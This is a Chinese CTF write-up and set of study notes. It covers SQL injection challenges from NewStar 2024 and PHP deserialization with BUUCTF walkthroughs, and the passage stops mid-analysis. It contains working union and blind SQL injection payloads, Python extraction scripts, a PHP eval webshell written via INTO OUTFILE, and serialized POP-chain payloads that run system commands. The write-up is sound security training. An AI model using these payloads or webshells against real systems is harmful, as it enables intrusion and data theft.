# NewStar  2024 (SQL注入题目)
## 谢谢皮蛋
先判断sql闭合类型 在搜索框输入 <font style="color:#601BDE;">1 </font>和 <font style="color:#601BDE;">1' #</font> 发现输入 <font style="color:#601BDE;">1' # </font><font style="color:#000000;">时报错所以判断为数值型注入</font>

<font style="color:#000000;">利用联合查询寻找回显位置：</font>

<font style="color:#000000;">payload：</font>

```sql
-1 union select 1 #
-1 union select 1,2 #
-1 union select 1,2,3 #
```

发现有两个回显位置

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1732541014444-f945da76-46e4-47cb-a52b-02131fc20666.png)

于是利用联合查询爆数据库名

```sql
-1 union select 1,database() #
```

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1732541084240-467ce420-6f74-4e71-886c-784d73740b46.png)

爆出库名为ctf 接着爆表名

```sql
-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #
```

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1732541276250-51352350-facb-46b2-8768-53e955fc17d6.png)

爆出两张表为Fl4g hexo 接着爆数据库的字段名

```sql
-1 union select 1,group_concat(column_name) from information_schema.columns where table_name='Fl4g' #
```

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1732541517632-d06e2446-5616-4897-9184-0f1387f80eea.png)

爆字段名的值 发现flag

```sql
-1 union select group_concat(des),group_concat(value) from Fl4g #
```

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1732541882150-98031d7e-88bf-4bb1-ae8b-9a29a0ad7582.png)

## blindsql1
题目是利用输入名字搜索  名字后加引号后加 <font style="color:#601BDE;">and 1=1 #</font>发现空格被过滤

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1732543337309-2fc96f6f-0280-4902-977a-46120f182dc9.png)

```sql
Alice'/**/or/**/1=1/**/#
```

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1732543493132-daae4b81-618e-4c26-b442-d7bcd3cb5d80.png)反斜杠被过滤 

```sql
Alice'()or()1=1()#
```

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1732543654183-4baad183-918b-48af-83d5-1adfd893db26.png) 发现=也被过滤（我们可以用like或in代替）

这里想到试用联合查询

```sql
Alice'()union()select()1()#
```

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1732543858359-7e1d3301-6792-44cb-995e-9c86fac57ffb.png)  结果union也被过滤

再试用报错注入

```sql
Alice'or(updatexml(1,concat(0x7e,database(),0x7e),1))#
```

发现没有如何回显 再结合题目名字应该属于盲注题目 并以利用  <font style="color:#601BDE;">Alice'and 0#</font> 和 <font style="color:#601BDE;">Alice'and 1# </font><font style="color:#000000;">尝试判断</font>

<font style="color:#000000;">先爆数据库中表的名字</font>

```python
import requests,time,string

url= 'http://127.0.0.1:59372/'

result= ''

for i in range(1,100):
    print('尝试次数',i)

    for c in  string.ascii_letters + string.digits + '_-{}':
        time.sleep(0.1)
        print('尝试的字符', c)

        tables=f'(Select(group_concat(table_name))from(infOrmation_schema.tables)where((table_schema)like(database())))'

        char=f'(ord(mid({tables},{i},1)))'

        b=f'(({char})in({ord(c)}))'

        p=f'Alice\'and({b})#'
        res=requests.get(url, params={'student_name': p})

        if 'Alice'in res.text:
            print('正确',c)
            result +=c
            print(result)
            break
```

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1732606285343-1b8fc9fc-2987-4eb1-8783-66f46081d04b.png)

爆出来的字符串拆解后发现有三张表表民为courses secrects students (分析flag可能藏在secrets表里面)

简单修改以下代码 接着爆表字段 由于or被过滤所以infOrmation大小写绕过

```python
import requests,time,string

url= 'http://127.0.0.1:65382/'

result= ''

for i in range(1,100):
    print('尝试次数',i)

    for c in  string.ascii_letters + string.digits + '_-{}':
        time.sleep(0.1)
        print('尝试的字符', c)

        columns=f'(Select(group_concat(column_name))from(infOrmation_schema.columns)where((table_name)like(\'secrets\')))'

        char=f'(ord(mid({columns},{i},1)))'

        b=f'(({char})in({ord(c)}))'

        p=f'Alice\'and({b})#'
        res=requests.get(url, params={'student_name': p})

        if 'Alice'in res.text:
            print('正确',c)
            result +=c
            print(result)
            break
```

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1732608358001-7ac3629e-867b-40e1-8043-148306b6dce5.png)

爆出字段id和secret_key 于是接着简单修改爆secret_key的值

```python
import requests,time,string

url= 'http://127.0.0.1:65382/'

result= ''

for i in range(1,100):
    print('尝试次数',i)

    for c in  string.ascii_letters + string.digits + ' ,_-{}':
        time.sleep(0.01)
        print('尝试的字符', c)

        value=f'(Select(group_concat(secret_value))from(secrets))'

        char=f'(ord(mid({value},{i},1)))'

        b=f'(({char})in({ord(c)}))'

        p=f'Alice\'and({b})#'
        res=requests.get(url, params={'student_name': p})

        if 'Alice'in res.text:
            print('正确',c)
            result +=c
            print(result)
            break
```

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1732609939399-4f1e807d-70e4-4c5b-ac75-58e01f87f939.png)

得到flag

## blindsql2
![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1732624771900-ad56ac61-b0d1-4707-97a4-90edc36955cb.png)

由于查询数据不被放出来所以没办法利用布尔盲注 所以这里使用延时盲注

```python
import requests,time,string

url= 'http://127.0.0.1:57324/'

result= ''

for i in range(1,100):
    print('尝试次数',i)

    for c in  string.ascii_letters + string.digits + ' ,_-{}':
        time.sleep(0.01)
        print('尝试的字符', c)

        tables=f'(Select(group_concat(table_name))from(infOrmation_schema.tables)where((table_schema)like(database())))'

        char=f'(ord(mid({tables},{i},1)))'

        b=f'(({char})in({ord(c)}))'

        p=f'Alice\'and(if({b},sleep(5),0))#'
        res=requests.get(url, params={'student_name': p})

        if  res.elapsed.total_seconds()>5:
            print('正确',c)
            result +=c
            print(result)
            break
```

爆出结果

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1732627388838-350620f1-40b8-4714-9030-1b4c87e2b5ac.png)

接着爆表中的字段名

```python
import requests,time,string

url= 'http://127.0.0.1:57324/'

result= ''

for i in range(1,100):
    print('尝试次数',i)

    for c in  string.ascii_letters + string.digits + ' ,_-{}':
        time.sleep(0.01)
        print('尝试的字符', c)

        columns=f'(Select(group_concat(column_name))from(infOrmation_schema.columns)where((table_name)like(\'secrets\')))'

        char=f'(ord(mid({columns},{i},1)))'

        b=f'(({char})in({ord(c)}))'

        p=f'Alice\'and(if({b},sleep(5),0))#'
        res=requests.get(url, params={'student_name': p})

        if  res.elapsed.total_seconds()>5:
            print('正确',c)
            result +=c
            print(result)
            break
```

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1732630185840-5d5ad2c2-2d0c-459a-9b47-a99ee964d9c1.png)

爆出flag

```python
import requests,time,string

url= 'http://127.0.0.1:57324/'

result= ''

for i in range(1,100):
    print('尝试次数',i)

    for c in  string.ascii_letters + string.digits + ' ,_-{}':
        time.sleep(0.01)
        print('尝试的字符', c)

        columns=f'(Select(group_concat(secret_value))from(secrets)where((secret_value)like(\'flag%\')))'

        char=f'(ord(mid({columns},{i},1)))'

        b=f'(({char})in({ord(c)}))'

        p=f'Alice\'and(if({b},sleep(5),0))#'
        res=requests.get(url, params={'student_name': p})

        if  res.elapsed.total_seconds()>5:
            print('正确',c)
            result +=c
            print(result)
            break
```

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1732685280880-8e317f2b-a206-4f78-a681-4009a236c13d.png)

## sqlshell
这题需要通过sql语句写入webshell

```python
Alice' union select 1,'<?php @eval($_POST[1]);?>',3 INTO OUTFILE '/var/www/html/2.php' #
```

写入webshell后访问2.php查看是否写成功

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1732631795350-0ea8b263-d0df-4968-8d7e-135786b20ddf.png)

再用中国蚁剑尝试连接

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1732632222515-22ba2ede-0d38-4665-b2b4-9dd5b495ad37.png)

连接成功后添加数据寻找flag

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1732632272854-e273a0b4-1fc8-43f6-a28a-de0b7664ef46.png)

# PHP反序列化知识笔记
参考文章[链接](https://blog.csdn.net/weixin_42628854/article/details/141569755?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522a7fbc8197d45505ee5fbe79c91a5b379%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=a7fbc8197d45505ee5fbe79c91a5b379&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-14-141569755-null-null.142^v100^pc_search_result_base7&utm_term=php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96&spm=1018.2226.3001.4187) [链接](https://blog.csdn.net/weixin_42628854/article/details/141569755?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522a7fbc8197d45505ee5fbe79c91a5b379%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=a7fbc8197d45505ee5fbe79c91a5b379&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-14-141569755-null-null.142^v100^pc_search_result_base7&utm_term=php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96&spm=1018.2226.3001.4187)

## <font style="color:#000000;">什么是PHP反序列化漏洞？</font>
在PHP中，unserialize() 函数用于将之前通过 serialize() 函数序列化的字符串还原成PHP的原始数据结构，如数组或对象。如果 unserialize() 处理的数据来自不可信的来源（例如用户输入），且没有适当的验证和清理，攻击者就能够控制此数据以尝试创建任何类型的对象，并调用其方法。

## <font style="color:#000000;">漏洞产生原因</font>
控制对象创建：攻击者可以控制序列化字符，强制应用程序创建特定的对象实例。



魔术方法触发：一些魔术方法如 __wakeup(), __destruct(), __toString(), 和 __call() 在对象的生命周期的特定时刻自动执行。如果攻击者可以控制这些对象的创建，他们可以触发这些方法以执行恶意代码。



利用现有的应用逻辑：在某些情况下，即使没有直接执行代码的能力，攻击者也可以通过改变应用状态或行为来利用应用逻辑。

## <font style="color:#000000;">php序列化的字母标识：</font>
```plain
a - 数组 (Array): 一种数据结构，可以存储多个相同类型的元素。
b - 布尔型 (Boolean): 一种数据类型，只有两个可能的值：true 或 false。
d - 双精度浮点数 (Double): 一种数据类型，用于存储双精度浮点数值。
i - 整型 (Integer): 一种数据类型，用于存储整数值。
o - 普通对象 (Common Object): 一个通用的对象类型，它可以是任何类的实例。
r - 引用 (Reference): 指向对象的引用，而不是对象本身。
s - 字符串 (String): 一种数据类型，用于存储文本数据。
C - 自定义对象 (Custom Object): 指由开发者定义的特定类的实例。
O - 类 (Class): 在面向对象编程中，类是一种蓝图或模板，用于创建对象。
N - 空 (Null): 在许多编程语言中，null 表示一个不指向任何对象的特殊值。
R - 指针引用 (Pointer Reference): 一个指针变量，其值为另一个变量的地址。
U - 统一码字符串 (Unicode String): 一种数据类型，用于存储包含各种字符编码的文本数据。
```

```plain
各类型值的serialize序列化：
 
空字符       null  ->     N;
整型         123   ->     i:123;
浮点型       1.5   ->     d:1.5;
boolean型    true   ->    b:1;
boolean型    fal    ->    b:0;
字符串       “haha”  ->   s:4:"haha";
```

## <font style="color:#000000;">类中的属性(public、protected、private)</font>
PHP 对属性或方法的**访问控制**，是通过在前面添加**关键字** public（公有），protected（受保护）或 private（私有）来实现的。



**public（公有）：**公有的类成员可以在**任何地方被访问**。



**protected（受保护**）：受保护的类成员则可以**被其自身以及其子类和父类访问**。



**private（私有）：**私有的类成员则**只能被其定义所在的类访问**。

注意：**访问控制修饰符不同**，序列化后属性的长度和属性值会有所不同，如下所示：

**public：**属性被序列化的时候属性值会变成 <font style="color:#601BDE;">属性名</font>

**protected：**属性被序列化的时候属性值会变成<font style="color:#601BDE;"> \x00*\x00属性名</font>

**private：**属性被序列化的时候属性值会变成 <font style="color:#601BDE;">\x00类名\x00属性名</font>

<font style="color:rgb(77, 77, 77);">其中：</font><font style="color:#601BDE;">\x00</font><font style="color:rgb(77, 77, 77);"> 表示</font>**<font style="color:rgb(77, 77, 77);">空字符</font>**<font style="color:rgb(77, 77, 77);">，但是还是占用一个字符位置（空格），如下例</font>

```python
<?php
class People{
    public $id;
    protected $gender;
    private $age;
    public function __construct(){
        $this->id = 'Hardworking666';
        $this->gender = 'male';
        $this->age = '18';
    }
}
$a = new People();
echo serialize($a);
?>

```

```python
O:6:"People":3:{s:2:"id";s:14:"Hardworking666";s:9:" * gender";s:4:"male";s:11:" People age";s:2:"18";}
```

## 常见的php反序列化ctf题目的做题步骤
1、复制源代码到本地

2、注释掉和属性无关的内容（只剩类名和属性）

3、根据题目需要给属性赋值（最关键的一步）

4、生成序列化数据（pop链），通常要urlencode

5、传递数据到服务器（攻击目标）

## <font style="color:#000000;">POP链构造</font>
在计算机安全领域，特别是在讨论反序列化漏洞时，"POP链"通常指的是"属性方向的编程"（Property-Oriented Programming）链。这种技术利用了应用程序中的已有代码，尤其是那些可以通过对象的一系列属性调用或方法调用来触发的代码。攻击者通过精心构造的恶意输入（即序列化的对象），使得在反序列化过程中会触发预定义的方法链，执行潜在的恶意活动。



一个 "POP链" 通常涉及以下几个步骤：

### <font style="color:#000000;">1.选择目标函数</font>
<font style="color:rgb(77, 77, 77);">首先，需要识别应用程序中哪些现有的函数可以被用于执行恶意行为，常见的可利用函数如下所示：</font>

#### <font style="color:#000000;">(1)命令执行函数</font>
<font style="color:rgb(77, 77, 77);">exec(),shell_exec(), system(), passthru(), proc_open和popen()</font>

<font style="color:rgb(77, 77, 77);">exec() 函数执行一个外部程序，并且只返回最后一行的输出结果。</font>

```plain
exec('ls -l', $output, $return_var);
print_r($output); // 打印所有输出行的数组
echo $return_var; // 执行状态代码
```

<font style="color:rgb(77, 77, 77);">shell_exec() 执行通过 shell 的命令，并且将完整的输出作为字符串返回。</font>

```plain
$output = shell_exec('ls -l');
echo "<pre>$output</pre>"; // 显示命令输出
```

<font style="color:rgb(77, 77, 77);">system() 函数用于执行外部程序，并显示输出。它是实时显示输出，适合用于需要即时反馈的场合。</font>

```plain
system('ls -l');
```

<font style="color:rgb(77, 77, 77);">passthru() 函数执行一个外部程序，并直接将原始输出传递给浏览器。</font>

```plain
passthru('cat image.png'); // 输出图片文件的内容
```

#### <font style="color:#000000;">(2)代码执行函数</font>
<font style="color:rgb(77, 77, 77);">eval() ,create_function() ,assert()</font>

<font style="color:rgb(77, 77, 77);">eval() 函数将字符串作为 PHP 代码执行。</font>

```plain
$code = 'echo "Hello, world!";';
eval($code);
```

#### <font style="color:#000000;">(3)文件读取类函数</font>
<font style="color:#000000;">file_get_contents(), fread(),readfile()</font>

<font style="color:#000000;">file_get_contents()读取整个文件到一个字符串。</font>

```plain
$content = file_get_contents("example.txt");
echo $content;
```

<font style="color:rgb(77, 77, 77);">fread()从文件指针中读取数据，必须使用fopen()打开文件。</font>

```plain
$file = fopen("example.txt", "r");
$content = fread($file, filesize("example.txt"));
fclose($file);
echo $content;
```

#### <font style="color:#000000;">(4)文件写入类函数</font>
<font style="color:rgb(77, 77, 77);">file_put_contents(), fwrite()</font>

<font style="color:rgb(77, 77, 77);">file_put_contents()将字符串写入文件中</font>

```plain
file_put_contents("example.txt", "Hello World!");
```

<font style="color:rgb(77, 77, 77);">fwrite()像文件中写入数据，需要先用fopen()打开文件并获取文件指针</font>

```plain
$file = fopen("example.txt", "w");
fwrite($file, "Hello World!");
fclose($file);
```

#### <font style="color:#000000;">(5)文件包含函数</font>
<font style="color:rgb(77, 77, 77);">include、require、include_once、require_once</font>

### <font style="color:#000000;">2.构造对象图</font>
<font style="color:rgb(77, 77, 77);">然后，创建一个对象图，这些对象通过它们的方法和属性相互关联，以确保当触发反序列化时可以按照特定顺序调用目标方法。</font>

### <font style="color:#000000;">3.控制流程</font>
<font style="color:rgb(77, 77, 77);">通过操纵对象状态和方法调用顺序，达到控制应用程序行为的目的。</font>

<font style="color:rgb(77, 77, 77);">简单举例：</font>

```php
<?php
class TestClass {
    public $test;
    function __wakeup() {
        eval($this->test);
    }
}
 
// 恶意用户控制的数据
$data = '';
unserialize($data);
```

<font style="color:rgb(77, 77, 77);">data序列化数据构造：</font>

```php
<?php
class TestClass {
    public $test;
    function __wakeup() {
        eval($this->test);
    }
}
 
$a=new TestClass();
$a->test = 'system(ls);';
 
echo serialize($a);
//此简单例子中无需任何绕过，仅将实例a的test值赋值为system(ls);，在根据魔术方法 __wakeup()在使用 unserialize()方法时自动调用，达到命令执行的目的。
```



## <font style="color:#000000;">常见魔术方法的触发</font>
```php
//魔术方法
 
__construct()       //类的构造函数，创建对象时触发
 
__destruct()        //类的析构函数，对象被销毁时触发
 
__call()            //调用对象不可访问、不存在的方法时触发
 
__callStatic()     //在静态上下文中调用不可访问的方法时触发
 
__get()            //调用不可访问、不存在的对象成员属性时触发
 
__set()           //在给不可访问、不存在的对象成员属性赋值时触发
 
__isset()         //当对不可访问属性调用isset()或empty()时触发
 
__unset()         //在不可访问的属性上使用unset()时触发
 
__invoke()        //把对象当初函数调用时触发
 
__sleep()        //执行serialize()时，先会调用这个方法
 
__wakeup()       //执行unserialize()时，先会调用这个方法
 
__toString()     //把对象当成字符串调用时触发
 
__clone()        //使用clone关键字拷贝完一个对象后触发
```

### __construct()和__destruct()
```php
//__construct()和__destruct()
 
<?php
class test
{
    public $a="haha";
    public function __construct()
    {
        echo "已创建--";
    }
    public function __destruct()
    {
        echo "已销毁";
    }
}
$a=new test();
 
?>
 
//输出：
已创建--已销毁
 
//对象被创建时触发__construct()方法，对象使用完被销毁时触发__destruct()方法
```

### __sleep()和__wakeup()
```php
//__sleep()和__wakeup()
 
<?php
class test
{
    public $a="haha";
    public function __sleep()
    {
        echo "使用了serialize()--";
        return array("a");
    }
    public function __wakeup()
    {
        echo "使用了unserialzie()";
    }
}
 
$a=new test();
$b=serialize($a);
$c=unserialize($b);
 
?>
 
//输出：
使用了serialize()--使用了unserialzie()
 
//对象被序列化时触发了__sleep(),字符串被反序列化时触发了__wakeup()
```

### __toString()和__invoke()
```php
//__toString()和__invoke()
 
<?php
class test
{
    public $a="haha";
    public function __toString()
    {
        return "被当成字符串了--";
    }
    public function __invoke()
    {
        echo "被当成函数了";
    }
}
 
$a=new test();
echo $a;
$a();
 
?>
 
//输出：
被当成字符串了--ss被当成函数了
 
//ehco $a 把对象当成字符串输出触发了__toString(),$a() 把对象当成
//函数执行触发了__invoke()
```

### __call（）和其他魔术方法
```php
//__call（）和其他魔术方法
 
<?php
class test
{
    public $h="haha";
 
    public function __call($arg1,$arg2)
    {
        echo "你调用了不存在的方法";
    }
}
 
$a=new test();
$a->h();
 
?>
 
//输出：
你调用了不存在的方法
 
//$a->h()调用了不存在的方法触发了__call()方法，其他魔术方法类似不再演示
```

## 一些简单的php反序列化绕过方法
### <font style="color:#000000;">__wakeup()方法漏洞</font>
存在此漏洞的php版本：php5-php5.6.25、php7-php7.0.10；



调用unserialize()方法时会先调用__wakeup()方法，但是当序列化字符串的表示成员属性的数字大于实际的对象的成员属性数量是时，__wakeup()方法不会被触发，以下的简单例题是__wakeup()方法漏洞的利用：

```php
//__wakeup()方法绕过例题
 
 <?php
 
header("Content-type:text/html;charset=utf-8");
error_reporting(0);
show_source("class.php");
 
class HaHaHa{
 
 
        public $admin;
        public $passwd;
 
        public function __construct(){
            $this->admin ="user";
            $this->passwd = "123456";
        }
 
        public function __wakeup(){
            $this->passwd = sha1($this->passwd);
        }
 
        public function __destruct(){
            if($this->admin === "admin" && $this->passwd === "wllm"){
                include("flag.php");
                echo $flag;
            }else{
                echo $this->passwd;
                echo "No wake up";
            }
        }
    }
 
$Letmeseesee = $_GET['p'];
unserialize($Letmeseesee);
 
?> NSSCTF{f7b177f4-8e9c-4154-9134-db0011b3b97a}
```

分析：

        只要满足__destruct()方法中的if条件就可以获得flag，构造payload时给对于属性赋值即可；

        然而，在反序列化调用unserialize()方法时会触发__wakeup方法，进而改变我们给$passwd属性的赋值，最终导致不满足if条件；

        因此需要避免__wakeup方法的触发，这就需要可以利用__wakeup()方法的漏洞，使序列化字符串的表示成员属性的数字大于实际的对象的成员属性数量，如下payload的构造：

```php
<?php
class HaHaHa{
    public $admin="admin";
    public $passwd="wllm";
}
 
$a=new HaHaHa();
 
$b=serialize($a);
echo "?p=".$b;
 
?>
 
//输出：
?p=O:6:"HaHaHa":2:{s:5:"admin";s:5:"admin";s:6:"passwd";s:4:"wllm";}
 
//将成员属性数量2改为3，大于实际值2即可，payload如下：
?p=O:6:"HaHaHa":3:{s:5:"admin";s:5:"admin";s:6:"passwd";s:4:"wllm";}
```

### <font style="color:#000000;">引用</font>
```php
//简单例题
 
<?php
 
show_source(__FILE__);
 
###very___so___easy!!!!
class test{
    public $a;
    public $b;
    public $c;
    public function __construct(){
        $this->a=1;
        $this->b=2;
        $this->c=3;
    }
    public function __wakeup(){
        $this->a='';
    }
    public function __destruct(){
        $this->b=$this->c;
        eval($this->a);
    }
}
$a=$_GET['a'];
if(!preg_match('/test":3/i',$a)){
    die("你输入的不正确！！！搞什么！！");
}
$bbb=unserialize($_GET['a']);
NSSCTF{This_iS_SO_SO_SO_EASY} 
```

分析

        魔术方法___wakeup()会使变量a为空，且由于正则限制无法通过改变成员数量绕过__wakeup()，这时可以使用引用的方法，使变量a与变量b永远相等，魔术方法__destruct()把变量c值赋给变量b时，相当于给变量a赋值，这就可以完成命令执行，payload如下：

```php
<?php
class test
{
    public $a;
    public $b;
    public $c='system("cat /fffffffffflagafag");';
 
}
$h = new test();
$h->b = &$h->a;   //注意：取会改变的属性的地址，如取a的地址赋值给b，当给a赋值时a会等于b的值
echo '?a='.serialize($h);
 
//输出
//?a=O:4:"test":3:{s:1:"a";N;s:1:"b";R:2;s:1:"c";s:33:"system("cat /fffffffffflagafag");";}
```

### <font style="color:rgb(79, 79, 79);">对类属性不敏感</font>
<font style="color:rgb(77, 77, 77);">protected和private属性的属性名与public属性的属性名不同，由于对属性不敏感，即使不加%00* %00和%00类名%00也可以被正确解析；</font>

### <font style="color:#000000;">大写S当十六进制绕过</font>
<font style="color:rgb(77, 77, 77);">表示字符串类型的s大写为S时，其对应的值会被当作十六进制解析；</font>

```php
例如   s:13:"SplFileObject"  中的Object被过滤
 
可改为  S:13:"SplFileOb\6aect"
 
小写s变大写S，长度13不变，\6a是字符j的十六进制编码
```

### <font style="color:#000000;">php类名不区分大小写</font>
```php
O:1:"A":2:{s:1:"c";s:2:"11";s:1:"b";s:2:"22";}
 
等效于
 
O:1:"a":2:{s:1:"c";s:2:"11";s:1:"b";s:2:"22";}
```

# PHP反序列化题目WP
## BUUCTF [极客大挑战 2019]PHP 1
根据题目提示 利用御剑工具扫描站点目录发现存在后缀名<font style="color:#601BDE;">www.zip</font>

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1732775470760-f9b413f0-526c-4738-b8ea-3ec7ad3a356b.png)

访问后下载一个压缩包 里面存在文件

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1732775628572-cd07a9c1-5dbe-4448-9a3b-5d2f5f9d98c3.png)

打开flag.php发现flag但是很明显是假的

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1732775682149-73316206-fe67-4575-a3ad-8c33206b197e.png)

接着打开class.php和index.php发现php反序列化漏洞

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1732775795210-2a4cfd7d-31d4-4268-b9fb-5e3b7c183c69.png)

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1732775824443-73c87a9f-452c-4be2-a00d-e85d98294160.png)

按照笔记中的做题步骤 把代码复制到本地操作 

通过代码审计需要将username=admin password=100 所以可构造pop链

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1732777883125-b0b45b39-24d8-4ca5-ae00-961b4e380f61.png)

运行后得到

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1732777909386-c9d94222-cd30-489e-9c14-df2c529121fe.png)

由于username和password属于私有属性所以在序列化时会出现空字符 上传时会出现错误 需要在空字符的地方替换为<font style="color:#601BDE;">%00 </font>

<font style="color:#000000;">并且需要绕过__wake_up() 所以在上传反序列化字符串时要修改属性个数值大于实际属性个数</font>

<font style="color:#000000;">最终payload 得到flag</font>

```python
/?select=O:4:"Name":3:{s:14:"%00Name%00username";s:5:"admin";s:14:"%00Name%00password";s:3:"100";}
```

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1732778235646-e7437bd9-ac84-4ab9-9970-f082cc5e6af2.png)

## BUUCTF [网鼎杯 2020 青龙组]AreUSerialz 1
 通过代码审计加了点注释 代码如下

```php
<?php

  include("flag.php");

highlight_file(__FILE__);

class FileHandler {

  protected $op;
  protected $filename;
  protected $content;

  function __construct() {
    $op = "1";
    $filename = "/tmp/tmpfile";
    $content = "Hello World!";
    $this->process(); //表示接着要去访问process函数
  }

  public function process() {
    if($this->op == "1") {
      $this->write(); //如果op=1，访问write函数
    } else if($this->op == "2") {
      $res = $this->read();
      $this->output($res); //如果op=2，访问read函数并输出
    } else {
      $this->output("Bad Hacker!");
    }
  }

  private function write() {
    if(isset($this->filename) && isset($this->content)) {
      if(strlen((string)$this->content) > 100) {
        $this->output("Too long!"); //如果filename及content不为空且content里字符串长度大于100输出Too long
        die();
      }
      $res = file_put_contents($this->filename, $this->content);
      if($res) $this->output("Successful!");
      else $this->output("Failed!");
    } else {
      $this->output("Failed!");
    }
  }

  private function read() {
    $res = "";
    if(isset($this->filename)) {
      $res = file_get_contents($this->filename); //如果filename不为空，获取filename输出为flag.php，我们就能获得flag.php里的内容
    }
    return $res;
  }

  private function output($s) {
    echo "[Result]: <br>";
    echo $s;
  }

  function __destruct() {
    if($this->op === "2")
      $this->op = "1";
    $this->content = "";
    $this->process();
  }

}

function is_valid($s) {
  for($i = 0; $i < strlen($s); $i++)
    if(!(ord($s[$i]) >= 32 && ord($s[$i]) <= 125))
      return false;
  return true; //形参变量i在ASCII码里为32-125则返回真
}

if(isset($_GET{'str'})) {

  $str = (string)$_GET['str'];
  if(is_valid($str)) { //调用is_valid函数判断是否满足在32-125范围
                       $obj = unserialize($str);
                     }

}

```

题目提示flag在文件flag.php中问题在于我们要如何读取flag

由于read()方法中有<font style="color:#601BDE;">file_get_contents($this->filename);</font><font style="color:#000000;">可读取文件的函数 并且当op=2时能够指向read()方法 所以我们只需使op=2 filename=flag.php</font>

<font style="color:#000000;">于是把代码复制到本地 并构造pop链</font>

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1732842565873-5f1b5b63-c64b-4a7d-8583-f4d752123e50.png)

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1732842577171-ec67b586-9586-4cda-a33b-90bf47b1ecc4.png)

得出pop链  （由于protected属性生成pop链时会出现空字符 所以修改protect为public在进行输出）

```php
O:11:"FileHandler":3:{s:2:"op";i:2;s:8:"filename";s:8:"flag.php";s:7:"content";N;}
```

传入pop链 打开源代码后发现flag

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1732842773214-a4a10576-63f5-4dad-ad31-cab6447e7661.png)

## BUUCTF [MRCTF2020]Ezpop 1
代码如下

```php
Welcome to index.php
<?php
//flag is in flag.php
//WTF IS THIS?
//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95
//And Crack It!
class Modifier {
    protected  $var;
    public function append($value){
        include($value);
    }
    public function __invoke(){
        $this->append($this->var);
    }
}

class Show{
    public $source;
    public $str;
    public function __construct($file='index.php'){
        $this->source = $file;
        echo 'Welcome to '.$this->source."<br>";
    }
    public function __toString(){
        return $this->str->source;
    }

    public function __wakeup(){
        if(preg_match("/gopher|http|file|ftp|https|dict|\.\./i", $this->source)) {
            echo "hacker";
            $this->source = "index.php";
        }
    }
}

class Test{
    public $p;
    public function __construct(){
        $this->p = array();
    }

    public function __get($key){
        $function = $this->p;
        return $function();
    }
}

if(isset($_GET['pop'])){
    @unserialize($_GET['pop']);
}
else{
    $a=new Show;
    highlight_file(__FILE__);
```

先看Modifier类

```php
class Modifier {
    protected  $var;
    public function append($value){
        include($value);
    }
    public function __invoke(){
        $this->append($this->var);
    }
}
```

Modifier类中存在include()文件包含漏洞函数 并且题目提示flag位于flag.php文件中 所以我们可利用php伪协议来读取flag 并且还存在<font style="color:#601BDE;">__invoke</font><font style="color:#000000;">魔术方法可以触发include函数  __invoke魔术方法在把对象当初函数调用时触发 我们找到了pop链的尾部（将php伪协议赋值给参数var） 所以我们要接着寻找能触发invoke函数的方法</font>

<font style="color:#000000;">再看Test类</font>

```php
class Test{
    public $p;
    public function __construct(){
        $this->p = array();
    }

    public function __get($key){
        $function = $this->p;
        return $function();
    }
}
```

在<font style="color:#601BDE;">__get</font>魔术方法中存在$function()可以将对象当成函数来使用 我们只需$p=new Modifier即可触发

但由于<font style="color:#601BDE;">__get</font><font style="color:#000000;">魔术方法在调用不可访问、不存在的对象成员属性时触发 我们还需寻找触发__get魔术方法的方法</font>

<font style="color:#000000;">最后看Show类</font>

```php
class Show{
    public $source;
    public $str;
    public function __construct($file='index.php'){
        $this->source = $file;
        echo 'Welcome to '.$this->source."<br>";
    }
    public function __toString(){
        return $this->str->source;
    }

    public function __wakeup(){
        if(preg_match("/gopher|http|file|ftp|https|dict|\.\./i", $this->source)) {
            echo "hacker";
            $this->source = "index.php";
        }
    }
}
```

由于类中的<font style="color:#601BDE;">__ToString()</font>魔术方法 调用了source属性 并且Test类中没有source属性 所以我们要想触发<font style="color:#601BDE;">__get</font>魔术方法<font style="color:#000000;">需要使得$</font><font style="color:#601BDE;">str=new Test </font><font style="color:#000000;">要想触发</font><font style="color:#601BDE;">__ToString</font><font style="color:#000000;">魔术方法需要把对象当成字符串调用 正好Show类的construct方法存在字符串拼接 所以我们需将</font><font style="color:#601BDE;">$source=new Show</font>

